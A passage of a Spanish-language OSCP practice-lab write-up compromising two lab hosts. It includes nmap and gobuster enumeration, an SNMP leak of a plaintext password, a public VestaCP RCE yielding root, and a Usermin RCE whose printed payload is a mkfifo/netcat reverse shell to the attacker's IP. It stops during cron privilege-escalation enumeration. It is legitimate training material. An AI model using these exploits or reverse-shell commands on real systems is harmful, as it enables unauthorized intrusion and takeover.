587/tcp  open  smtp     Exim smtpd 4.90_1
|_ssl-date: 2025-08-26T18:00:52+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
| smtp-commands: oscp.exam Hello nmap.scanme.org [192.168.45.152], SIZE 52428800, 8BITMIME, PIPELINING, AUTH PLAIN LOGIN, CHUNKING, STARTTLS, HELP
|_ Commands supported: AUTH STARTTLS HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP
993/tcp  open  ssl/imap Dovecot imapd (Ubuntu)
|_imap-capabilities: more have AUTH=PLAIN Pre-login IDLE AUTH=LOGINA0001 post-login capabilities ID OK SASL-IR LITERAL+ ENABLE LOGIN-REFERRALS IMAP4rev1 listed
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
|_ssl-date: TLS randomness does not represent time
995/tcp  open  ssl/pop3 Dovecot pop3d
|_pop3-capabilities: TOP AUTH-RESP-CODE UIDL SASL(PLAIN LOGIN) USER CAPA PIPELINING RESP-CODES
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
|_ssl-date: TLS randomness does not represent time
2525/tcp open  smtp     Exim smtpd 4.90_1
|_ssl-date: 2025-08-26T18:00:43+00:00; -8s from scanner time.
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
| smtp-commands: oscp.exam Hello nmap.scanme.org [192.168.45.152], SIZE 52428800, 8BITMIME, PIPELINING, AUTH PLAIN LOGIN, CHUNKING, STARTTLS, HELP
|_ Commands supported: AUTH STARTTLS HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP
3306/tcp open  mysql    MySQL 5.7.40-0ubuntu0.18.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.40-0ubuntu0.18.04.1
|   Thread ID: 14
|   Capabilities flags: 65535
|   Some Capabilities: IgnoreSigpipes, Support41Auth, Speaks41ProtocolOld, Speaks41ProtocolNew, SupportsTransactions, SwitchToSSLAfterHandshake, ConnectWithDatabase, DontAllowDatabaseTableColumn, InteractiveClient, IgnoreSpaceBeforeParenthesis, LongColumnFlag, LongPassword, SupportsCompression, ODBCClient, SupportsLoadDataLocal, FoundRows, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: &)v^WP"e\x03Ii\x0D39\x02Q\x04 e~
|_  Auth Plugin Name: mysql_native_password
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=MySQL_Server_5.7.40_Auto_Generated_Server_Certificate
| Not valid before: 2022-11-08T08:15:37
|_Not valid after:  2032-11-05T08:15:37
8080/tcp open  http     Apache httpd 2.4.29 ((Ubuntu) mod_fcgid/2.3.9 OpenSSL/1.1.1)
|_http-server-header: Apache/2.4.29 (Ubuntu) mod_fcgid/2.3.9 OpenSSL/1.1.1
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: oscp.exam &mdash; Coming Soon
| http-methods: 
|_  Potentially risky methods: TRACE
8083/tcp open  http     nginx
|_http-title: Did not follow redirect to https://192.168.193.156:8083/
8443/tcp open  http     Apache httpd 2.4.29 ((Ubuntu) mod_fcgid/2.3.9 OpenSSL/1.1.1)
|_http-server-header: Apache/2.4.29 (Ubuntu) mod_fcgid/2.3.9 OpenSSL/1.1.1
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Apache2 Ubuntu Default Page: It works
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11
Network Distance: 4 hops
Service Info: Host: oscp.exam; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 6s, deviation: 39s, median: -8s

TRACEROUTE (using port 1723/tcp)
HOP RTT       ADDRESS
1   198.96 ms 192.168.45.1
2   198.94 ms 192.168.45.254
3   199.03 ms 192.168.251.1
4   199.14 ms 192.168.193.156
```

#### Tabla de puertos y servicios

| Puerto   | Estado | Servicio | Versión / Información                                         |
| -------- | ------ | -------- | ------------------------------------------------------------- |
| 21/tcp   | open   | ftp      | vsftpd 3.0.3                                                  |
| 22/tcp   | open   | ssh      | OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)  |
| 25/tcp   | open   | smtp     | Exim smtpd 4.90\_1                                            |
| 53/tcp   | open   | domain   | ISC BIND 9.11.3-1ubuntu1.18 (Ubuntu Linux)                    |
| 80/tcp   | open   | http     | nginx                                                         |
| 110/tcp  | open   | pop3     | Dovecot pop3d                                                 |
| 143/tcp  | open   | imap     | Dovecot imapd (Ubuntu)                                        |
| 465/tcp  | open   | ssl/smtp | Exim smtpd 4.90\_1                                            |
| 587/tcp  | open   | smtp     | Exim smtpd 4.90\_1                                            |
| 993/tcp  | open   | ssl/imap | Dovecot imapd (Ubuntu)                                        |
| 995/tcp  | open   | ssl/pop3 | Dovecot pop3d                                                 |
| 2525/tcp | open   | smtp     | Exim smtpd 4.90\_1                                            |
| 3306/tcp | open   | mysql    | MySQL 5.7.40-0ubuntu0.18.04.1                                 |
| 8080/tcp | open   | http     | Apache httpd 2.4.29 ((Ubuntu) mod\_fcgid/2.3.9 OpenSSL/1.1.1) |
| 8083/tcp | open   | http     | nginx                                                         |
| 8443/tcp | open   | http     | Apache httpd 2.4.29 ((Ubuntu) mod\_fcgid/2.3.9 OpenSSL/1.1.1) |


#### Tabla de certificados SSL

| Puerto   | Servicio           | Common Name (CN)                                            | Organización        | Validez (Desde – Hasta) | Observaciones                                   |
| -------- | ------------------ | ----------------------------------------------------------- | ------------------- | ----------------------- | ----------------------------------------------- |
| 21/tcp   | ftp (vsftpd)       | oscp.example.com                                            | Vesta Control Panel | 2022-11-08 → 2023-11-08 | Cert. caducado, reutilizado en varios servicios |
| 25/tcp   | smtp (Exim)        | oscp.example.com                                            | Vesta Control Panel | 2022-11-08 → 2023-11-08 | Caducado, mismo que en FTP/POP3/IMAP            |
| 110/tcp  | pop3 (Dovecot)     | oscp.example.com                                            | Vesta Control Panel | 2022-11-08 → 2023-11-08 | Caducado, compartido                            |
| 143/tcp  | imap (Dovecot)     | oscp.example.com                                            | Vesta Control Panel | 2022-11-08 → 2023-11-08 | Caducado, compartido                            |
| 465/tcp  | ssl/smtp (Exim)    | oscp.example.com                                            | Vesta Control Panel | 2022-11-08 → 2023-11-08 | Caducado, compartido                            |
| 587/tcp  | smtp (Exim)        | oscp.example.com                                            | Vesta Control Panel | 2022-11-08 → 2023-11-08 | Caducado, compartido                            |
| 993/tcp  | ssl/imap (Dovecot) | oscp.example.com                                            | Vesta Control Panel | 2022-11-08 → 2023-11-08 | Caducado, compartido                            |
| 995/tcp  | ssl/pop3 (Dovecot) | oscp.example.com                                            | Vesta Control Panel | 2022-11-08 → 2023-11-08 | Caducado, compartido                            |
| 2525/tcp | smtp (Exim)        | oscp.example.com                                            | Vesta Control Panel | 2022-11-08 → 2023-11-08 | Caducado, compartido                            |
| 3306/tcp | mysql              | MySQL\_Server\_5.7.40\_Auto\_Generated\_Server\_Certificate | –                   | 2022-11-08 → 2032-11-05 | Auto-generado, válido 10 años                   |

* Se detectan en los puertos **8080 8083 8443** servicios http, indagando en el navegador encontramos en **8083** un formulario **Vesta**

* Buscamos exploits 

```bash
┌──(root㉿kali)-[/home/kali]
└─# searchsploit "Vesta"       
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                  |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
ActiveState Perl.exe x64 Client 5.20.2 - Crash (PoC)                                                                                                                            | windows_x86-64/dos/38085.pl
MediaHouse Software Statistics Server LiveStats 5.2 - Remote Buffer Overflow                                                                                                    | windows/remote/20148.pl
netkit-telnet-0.17 telnetd (Fedora 31) - 'BraveStarr' Remote Code Execution                                                                                                     | linux/remote/48170.py
Vesta Control Panel 0.9.8 - OS Command Injection                                                                                                                                | php/webapps/37369.txt
Vesta Control Panel 0.9.8-15 - Persistent Cross-Site Scripting                                                                                                                  | php/webapps/39468.txt
Vesta Control Panel 0.9.8-16 - Local Privilege Escalation                                                                                                                       | linux/local/40953.sh
Vesta Control Panel 0.9.8-26 - Authenticated Remote Code Execution (Metasploit)                                                                                                 | multiple/webapps/48294.rb
VestaCP 0.9.8 - 'v_interface' Add IP Stored XSS                                                                                                                                 | multiple/webapps/49662.txt
VestaCP 0.9.8 - 'v_sftp_licence' Command Injection                                                                                                                              | multiple/webapps/49674.txt
VestaCP 0.9.8 - File Upload CSRF                                                                                                                                                | multiple/webapps/49659.html
VestaCP 0.9.8-26 - 'backup' Information Disclosure                                                                                                                              | multiple/webapps/49220.txt
VestaCP 0.9.8-26 - 'LoginAs' Insufficient Session Validation                                                                                                                    | multiple/webapps/49219.txt
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

[https://github.com/CSpanias/vesta-rce-exploit](Custom Exploit)

La superficie de ataque esta definida, hay un formulario de login, una base de datos mysql y php, lo cual nos deja varios vectores de ataque para explorar.

* Vectores:

1. Explorar inyecciones SQL

2. Explorar distintos exploits para **Vesta**

3. Passwords attacks sobre formulario login

4. Explorar alternativas en otros puertos y servicios como ftp etc..

* Exploit **37369** 

1. Exploramos rutas. 

> Ejecutamos gobuster con la opcion **-k** para ignorar el certificado **ssl**

- **list**

```bash
┌──(root㉿kali)-[/home/…/OffSec/Challenges/6_OSCP-C/Standalone-Machines]
└─# gobuster dir -u https://192.168.193.156:8083 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -k

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://192.168.193.156:8083
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 162] [--> https://192.168.193.156:8083/images/]
/download             (Status: 301) [Size: 162] [--> https://192.168.193.156:8083/download/]
/search               (Status: 301) [Size: 162] [--> https://192.168.193.156:8083/search/]
/login                (Status: 301) [Size: 162] [--> https://192.168.193.156:8083/login/]
/templates            (Status: 301) [Size: 162] [--> https://192.168.193.156:8083/templates/]
/view                 (Status: 301) [Size: 162] [--> https://192.168.193.156:8083/view/]
/list                 (Status: 301) [Size: 162] [--> https://192.168.193.156:8083/list/]
/static               (Status: 301) [Size: 162] [--> https://192.168.193.156:8083/static/]
/upload               (Status: 301) [Size: 162] [--> https://192.168.193.156:8083/upload/]
/start                (Status: 301) [Size: 162] [--> https://192.168.193.156:8083/start/]
/add                  (Status: 301) [Size: 162] [--> https://192.168.193.156:8083/add/]
/css                  (Status: 301) [Size: 162] [--> https://192.168.193.156:8083/css/]
/schedule             (Status: 301) [Size: 162] [--> https://192.168.193.156:8083/schedule/]
/edit                 (Status: 301) [Size: 162] [--> https://192.168.193.156:8083/edit/]
/update               (Status: 301) [Size: 162] [--> https://192.168.193.156:8083/update/]
/js                   (Status: 301) [Size: 162] [--> https://192.168.193.156:8083/js/]
/api                  (Status: 301) [Size: 162] [--> https://192.168.193.156:8083/api/]
/logout               (Status: 301) [Size: 162] [--> https://192.168.193.156:8083/logout/]
/inc                  (Status: 301) [Size: 162] [--> https://192.168.193.156:8083/inc/]
/error                (Status: 301) [Size: 162] [--> https://192.168.193.156:8083/error/]
/reset                (Status: 301) [Size: 162] [--> https://192.168.193.156:8083/reset/]
/delete               (Status: 301) [Size: 162] [--> https://192.168.193.156:8083/delete/]
/bulk                 (Status: 301) [Size: 162] [--> https://192.168.193.156:8083/bulk/]
/stop                 (Status: 301) [Size: 162] [--> https://192.168.193.156:8083/stop/]
/generate             (Status: 301) [Size: 162] [--> https://192.168.193.156:8083/generate/]
```

- **backup**

```bash
┌──(root㉿kali)-[/home/…/Challenges/6_OSCP-C/Standalone-Machines/Frankfurt]
└─# gobuster dir -u https://192.168.193.156:8083/list -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -k
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://192.168.193.156:8083/list
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/user                 (Status: 301) [Size: 162] [--> https://192.168.193.156:8083/list/user/]
/stats                (Status: 301) [Size: 162] [--> https://192.168.193.156:8083/list/stats/]
/web                  (Status: 301) [Size: 162] [--> https://192.168.193.156:8083/list/web/]
/mail                 (Status: 301) [Size: 162] [--> https://192.168.193.156:8083/list/mail/]
/directory            (Status: 301) [Size: 162] [--> https://192.168.193.156:8083/list/directory/]
/server               (Status: 301) [Size: 162] [--> https://192.168.193.156:8083/list/server/]
/updates              (Status: 301) [Size: 162] [--> https://192.168.193.156:8083/list/updates/]
/log                  (Status: 301) [Size: 162] [--> https://192.168.193.156:8083/list/log/]
/db                   (Status: 301) [Size: 162] [--> https://192.168.193.156:8083/list/db/]
/firewall             (Status: 301) [Size: 162] [--> https://192.168.193.156:8083/list/firewall/]
/ip                   (Status: 301) [Size: 162] [--> https://192.168.193.156:8083/list/ip/]
/dns                  (Status: 301) [Size: 162] [--> https://192.168.193.156:8083/list/dns/]
/backup               (Status: 301) [Size: 162] [--> https://192.168.193.156:8083/list/backup/]
/package              (Status: 301) [Size: 162] [--> https://192.168.193.156:8083/list/package/]
/cron                 (Status: 301) [Size: 162] [--> https://192.168.193.156:8083/list/cron/]
/favorites            (Status: 301) [Size: 162] [--> https://192.168.193.156:8083/list/favorites/]
/notifications        (Status: 301) [Size: 162] [--> https://192.168.193.156:8083/list/notifications/]
```

- **index.php**

```bash
┌──(root㉿kali)-[/home/…/Challenges/6_OSCP-C/Standalone-Machines/Frankfurt]
└─# gobuster dir -u https://192.168.193.156:8083/list/backup -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php -k
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://192.168.193.156:8083/list/backup
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 2586]
```

* Necesitamos la version de Vesta:

```bash
┌──(root㉿kali)-[/home/…/Challenges/6_OSCP-C/Standalone-Machines/Frankfurt]
└─# snmpwalk -c public -v1 192.168.193.156 1.3.6.1.2.1.25.6.3.1.2

iso.3.6.1.2.1.25.6.3.1.2.753 = STRING: "vesta-1.0.0-6"
iso.3.6.1.2.1.25.6.3.1.2.754 = STRING: "vesta-ioncube-1.0.0-1"
iso.3.6.1.2.1.25.6.3.1.2.755 = STRING: "vesta-nginx-1.0.0-1"
iso.3.6.1.2.1.25.6.3.1.2.756 = STRING: "vesta-php-1.0.0-1"
iso.3.6.1.2.1.25.6.3.1.2.757 = STRING: "vesta-softaculous-1.0.0-1"

```

* Enumeramos **SNMP**

- Strings en texto plano:

```bash
┌──(root㉿kali)-[/home/…/Challenges/6_OSCP-C/Standalone-Machines/Frankfurt]
└─# snmpwalk -v2c -c public 192.168.193.156 1.3.6.1.4.1

...

iso.3.6.1.4.1.8072.1.3.2.2.1.2.14.114.101.115.101.116.45.112.97.115.115.119.111.114.100 = STRING: "/bin/sh"
iso.3.6.1.4.1.8072.1.3.2.2.1.2.18.114.101.115.101.116.45.112.97.115.115.119.111.114.100.45.99.109.100 = STRING: "/bin/echo"
iso.3.6.1.4.1.8072.1.3.2.2.1.3.14.114.101.115.101.116.45.112.97.115.115.119.111.114.100 = STRING: "-c \"echo \\\"jack:3PUKsX98BMupBiCf\\\" | chpasswd\""
iso.3.6.1.4.1.8072.1.3.2.2.1.3.18.114.101.115.101.116.45.112.97.115.115.119.111.114.100.45.99.109.100 = STRING: "\"\\\"jack:3PUKsX98BMupBiCf\\\" | chpasswd\""
iso.3.6.1.4.1.8072.1.3.2.2.1.4.14.114.101.115.101.116.45.112.97.115.115.119.111.114.100 = ""
iso.3.6.1.4.1.8072.1.3.2.2.1.4.18.114.101.115.101.116.45.112.97.115.115.119.111.114.100.45.99.109.100 = ""
iso.3.6.1.4.1.8072.1.3.2.2.1.5.14.114.101.115.101.116.45.112.97.115.115.119.111.114.100 = INTEGER: 5
iso.3.6.1.4.1.8072.1.3.2.2.1.5.18.114.101.115.101.116.45.112.97.115.115.119.111.114.100.45.99.109.100 = INTEGER: 5
iso.3.6.1.4.1.8072.1.3.2.2.1.6.14.114.101.115.101.116.45.112.97.115.115.119.111.114.100 = INTEGER: 2
iso.3.6.1.4.1.8072.1.3.2.2.1.6.18.114.101.115.101.116.45.112.97.115.115.119.111.114.100.45.99.109.100 = INTEGER: 2
iso.3.6.1.4.1.8072.1.3.2.2.1.7.14.114.101.115.101.116.45.112.97.115.115.119.111.114.100 = INTEGER: 1
iso.3.6.1.4.1.8072.1.3.2.2.1.7.18.114.101.115.101.116.45.112.97.115.115.119.111.114.100.45.99.109.100 = INTEGER: 1
iso.3.6.1.4.1.8072.1.3.2.2.1.20.14.114.101.115.101.116.45.112.97.115.115.119.111.114.100 = INTEGER: 4
iso.3.6.1.4.1.8072.1.3.2.2.1.20.18.114.101.115.101.116.45.112.97.115.115.119.111.114.100.45.99.109.100 = INTEGER: 4
iso.3.6.1.4.1.8072.1.3.2.2.1.21.14.114.101.115.101.116.45.112.97.115.115.119.111.114.100 = INTEGER: 1
iso.3.6.1.4.1.8072.1.3.2.2.1.21.18.114.101.115.101.116.45.112.97.115.115.119.111.114.100.45.99.109.100 = INTEGER: 1
iso.3.6.1.4.1.8072.1.3.2.3.1.1.14.114.101.115.101.116.45.112.97.115.115.119.111.114.100 = STRING: "Changing password for jack."
iso.3.6.1.4.1.8072.1.3.2.3.1.1.18.114.101.115.101.116.45.112.97.115.115.119.111.114.100.45.99.109.100 = STRING: "\"jack:3PUKsX98BMupBiCf\" | chpasswd"
iso.3.6.1.4.1.8072.1.3.2.3.1.2.14.114.101.115.101.116.45.112.97.115.115.119.111.114.100 = STRING: "Changing password for jack."
iso.3.6.1.4.1.8072.1.3.2.3.1.2.18.114.101.115.101.116.45.112.97.115.115.119.111.114.100.45.99.109.100 = STRING: "\"jack:3PUKsX98BMupBiCf\" | chpasswd"
iso.3.6.1.4.1.8072.1.3.2.3.1.3.14.114.101.115.101.116.45.112.97.115.115.119.111.114.100 = INTEGER: 1
iso.3.6.1.4.1.8072.1.3.2.3.1.3.18.114.101.115.101.116.45.112.97.115.115.119.111.114.100.45.99.109.100 = INTEGER: 1
iso.3.6.1.4.1.8072.1.3.2.3.1.4.14.114.101.115.101.116.45.112.97.115.115.119.111.114.100 = INTEGER: 256
iso.3.6.1.4.1.8072.1.3.2.3.1.4.18.114.101.115.101.116.45.112.97.115.115.119.111.114.100.45.99.109.100 = INTEGER: 0
iso.3.6.1.4.1.8072.1.3.2.4.1.2.14.114.101.115.101.116.45.112.97.115.115.119.111.114.100.1 = STRING: "Changing password for jack."
iso.3.6.1.4.1.8072.1.3.2.4.1.2.18.114.101.115.101.116.45.112.97.115.115.119.111.114.100.45.99.109.100.1 = STRING: "\"jack:3PUKsX98BMupBiCf\" | chpasswd"

...

```

* Con las credenciales de jack ejecutamos este [https://github.com/CSpanias/vesta-rce-exploit?tab=readme-ov-file](exploit de Vesta)

```bash
┌──(root㉿kali)-[/home/…/6_OSCP-C/Standalone-Machines/Frankfurt/vesta-rce-exploit]
└─# python3 vesta-rce-exploit.py 192.168.193.156:8083 jack 3PUKsX98BMupBiCf 
[!] No protocol specified, assuming https://
[INFO] Attempting login to https://192.168.193.156:8083 as jack
[+] Logged in as jack
[INFO] Checking for existing webshell or creating one
[!] cvt3bvkjxu.poc not found, creating one...
[+] cvt3bvkjxu.poc added
[+] cvt3bvkjxu.poc found, looking up webshell
[!] webshell not found, creating one..
[+] Webshell uploaded
[INFO] Creating mailbox on domain cvt3bvkjxu.poc
[!] Mail domain not found, creating one..
[+] Mail domain created
[+] Mail account created
[INFO] Editing mailbox to test payload
[INFO] Deploying backdoor via mailbox editing
[INFO] [+] Root shell possibly obtained. Enter commands:
# whoami
root

# cat /root/proof.txt
4cb795c65d4168cd5f8c614a59e1eaca

# ls /home/jack
conf
local.txt
mail
tmp
web

# cat /home/jack/local.txt
9cfca959e54738e70905a4024d16a44a

# 
```

## Charlie

* Enumeracion:

```bash
┌──(root㉿kali)-[/home/…/Challenges/6_OSCP-C/Standalone-Machines/Charlie]
└─# nmap -A 192.168.193.157 -oN charlie-result.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-28 23:08 -03
Nmap scan report for 192.168.193.157
Host is up (0.19s latency).
Not shown: 996 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.45.152
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 114      120          4096 Nov 02  2022 backup
22/tcp    open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0e:ad:d7:de:60:2b:49:ef:42:3b:1e:76:9c:77:33:85 (ECDSA)
|_  256 99:b5:48:fb:77:df:18:b0:1d:ad:e0:92:f3:e1:26:0d (ED25519)
80/tcp    open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.52 (Ubuntu)
20000/tcp open  http    MiniServ 1.820 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=utf-8).
|_http-server-header: MiniServ/1.820
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1723/tcp)
HOP RTT       ADDRESS
1   234.96 ms 192.168.45.1
2   234.93 ms 192.168.45.254
3   234.98 ms 192.168.251.1
4   235.13 ms 192.168.193.157

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.60 seconds
```

* Login ftp anonimo

```bash
┌──(root㉿kali)-[/home/…/Challenges/6_OSCP-C/Standalone-Machines/Charlie]
└─# lftp -u anonymous, 192.168.193.157      
lftp anonymous@192.168.193.157:~> set ftp:passive-mode off
lftp anonymous@192.168.193.157:~> ls
drwxr-xr-x    2 114      120          4096 Nov 02  2022 backup
lftp anonymous@192.168.193.157:/> get backup
get: Access failed: 550 Failed to open file. (backup)             
lftp anonymous@192.168.193.157:/> cd backup
lftp anonymous@192.168.193.157:/backup> ls
-rw-r--r--    1 114      120        145831 Nov 02  2022 BROCHURE-TEMPLATE.pdf
-rw-r--r--    1 114      120        159765 Nov 02  2022 CALENDAR-TEMPLATE.pdf
-rw-r--r--    1 114      120        336971 Nov 02  2022 FUNCTION-TEMPLATE.pdf
-rw-r--r--    1 114      120        739052 Nov 02  2022 NEWSLETTER-TEMPLATE.pdf
-rw-r--r--    1 114      120        888653 Nov 02  2022 REPORT-TEMPLATE.pdf
lftp anonymous@192.168.193.157:/backup> get REPORT-TEMPLATE.pdf
888653 bytes transferred in 3 seconds (328.0 KiB/s)                     
lftp anonymous@192.168.193.157:/backup> get FUNCTION-TEMPLATE.pdf
336971 bytes transferred in 2 seconds (163.4 KiB/s)                 
lftp anonymous@192.168.193.157:/backup> get BROCHURE-TEMPLATE.pdf
145831 bytes transferred in 2 seconds (78.5 KiB/s)                  
lftp anonymous@192.168.193.157:/backup> get CALENDAR-TEMPLATE.pdf
159765 bytes transferred in 2 seconds (83.9 KiB/s)                  
lftp anonymous@192.168.193.157:/backup> get NEWSLETTER-TEMPLATE.pdf
739052 bytes transferred in 2 seconds (313.4 KiB/s)                   
lftp anonymous@192.168.193.157:/backup> 
```

* Despues de descargar los pdf los examinamos con **exiftool** y generamos una lista de usuarios

* Buscamos exploits y CVE para **MiniServ/1.820**

```bash
┌──(root㉿kali)-[/home/…/Challenges/6_OSCP-C/Standalone-Machines/Charlie]
└─# searchsploit "Usermin 1.820"                       
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                  |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Usermin 1.820 - Remote Code Execution (RCE) (Authenticated)                                                                                                                     | linux/webapps/50234.py
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                                                                                                                                                                                                  
┌──(root㉿kali)-[/home/…/Challenges/6_OSCP-C/Standalone-Machines/Charlie]
└─# searchsploit -m 50234       
  Exploit: Usermin 1.820 - Remote Code Execution (RCE) (Authenticated)
      URL: https://www.exploit-db.com/exploits/50234
     Path: /usr/share/exploitdb/exploits/linux/webapps/50234.py
    Codes: N/A
 Verified: False
File Type: Python script, Unicode text, UTF-8 text executable
Copied to: /home/kali/OffSec/Challenges/6_OSCP-C/Standalone-Machines/Charlie/50234.py
```

* Agregamos en nuestro /etc/hosts la ip y la asociamos a **oscp**

1. Modificamos el exploit colocamos nuestra ip y un puerto de confianza _**el buen y confiable 80**_

2. Ejecutamos con los usuarios el exploit robert:robert, mark:mark, cassie:cassie y logramos entrar como **cassie**

```bash
┌──(root㉿kali)-[/home/…/Challenges/6_OSCP-C/Standalone-Machines/Charlie]
└─# python3 50234.py -u "192.168.193.157" -l "cassie" -p "cassie" 
/home/kali/OffSec/Challenges/6_OSCP-C/Standalone-Machines/Charlie/50234.py:82: SyntaxWarning: invalid escape sequence '\?'
  last_gets_key = re.findall("edit_key.cgi\?(.*?)'",str(key_list.content))[-2]
[+] Target https://192.168.193.157:20000
[+] Login successfully
[+] Setup GnuPG
[+] Payload {'name': '";rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.152 80 >/tmp/f;echo "', 'email': '1337@webmin.com'}
[+] Setup successful
[+] Fetching key list
[+] Key : idx=2\
```

3. Receptor

```bash
┌──(root㉿kali)-[/home/…/Challenges/6_OSCP-C/Standalone-Machines/Charlie]
└─# nc -lvnp 80     
listening on [any] 80 ...
connect to [192.168.45.152] from (UNKNOWN) [192.168.193.157] 43360
sh: cannot set terminal process group (1018): Inappropriate ioctl for device
sh: no job control in this shell
sh-5.1$ whoami
whoami
cassie
sh-5.1$ pwd
pwd
/usr/share/usermin/gnupg
sh-5.1$ cd /
cd /
sh-5.1$ cd home
cd home
sh-5.1$ ls
ls
cassie
robert
sh-5.1$ cd cassie
cd cassie
sh-5.1$ ls
ls
local.txt
sh-5.1$ cat local.txt
cat local.txt
c66cbf91888dd909f366d530537805ca
sh-5.1$ 
```

#### Elevamos Privilegios

**Enumeracion**

* Cron jobs

```bash
sh-5.1$ grep "CRON" /var/log/syslog
grep "CRON" /var/log/syslog
Aug 29 14:02:01 oscp CRON[1374]: (root) CMD (cd /opt/admin && tar -zxf /tmp/backup.tar.gz *)
Aug 29 14:02:01 oscp CRON[1373]: (CRON) info (No MTA installed, discarding output)
Aug 29 14:04:01 oscp CRON[1383]: (root) CMD (cd /opt/admin && tar -zxf /tmp/backup.tar.gz *)
Aug 29 14:04:01 oscp CRON[1382]: (CRON) info (No MTA installed, discarding output)
Aug 29 14:06:01 oscp CRON[1392]: (root) CMD (cd /opt/admin && tar -zxf /tmp/backup.tar.gz *)
Aug 29 14:06:01 oscp CRON[1391]: (CRON) info (No MTA installed, discarding output)
Aug 29 14:08:01 oscp CRON[1403]: (root) CMD (cd /opt/admin && tar -zxf /tmp/backup.tar.gz *)
Aug 29 14:08:01 oscp CRON[1402]: (CRON) info (No MTA installed, discarding output)
Aug 29 14:10:01 oscp CRON[1409]: (root) CMD (cd /opt/admin && tar -zxf /tmp/backup.tar.gz *)
Aug 29 14:10:01 oscp CRON[1408]: (CRON) info (No MTA installed, discarding output)
Aug 29 14:12:01 oscp CRON[1464]: (root) CMD (cd /opt/admin && tar -zxf /tmp/backup.tar.gz *)
Aug 29 14:12:01 oscp CRON[1463]: (CRON) info (No MTA installed, discarding output)

